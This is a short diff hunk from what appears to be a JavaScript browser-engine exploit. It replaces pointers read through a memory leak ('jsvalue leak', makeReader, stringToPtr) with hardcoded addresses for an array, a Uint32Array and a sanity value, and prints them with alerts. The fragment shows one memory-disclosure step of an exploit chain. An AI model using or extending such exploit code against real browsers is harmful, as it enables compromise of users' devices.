@@ -230,9 +230,9 @@ while(jsvalue_leak === null)
 alert("jsvalue leak: " + jsvalue + " -> " + hex(jsvalue_leak));
 
 var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-var array256 = stringToPtr(rd_leak, 16); //arrays[256]
-var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
-var sanity = stringToPtr(rd_leak, 32);
+var array256 = 0x132a; //arrays[256]
+var ui32a = 0x200fa1748; //Uint32Array
+var sanity = 0x2019cdeb8;
 alert("array256="+hex(array256)+" ui32a="+hex(ui32a)+" sanity="+hex(sanity));
 
 var rd_arr = makeReader(array256, 'ffs5');
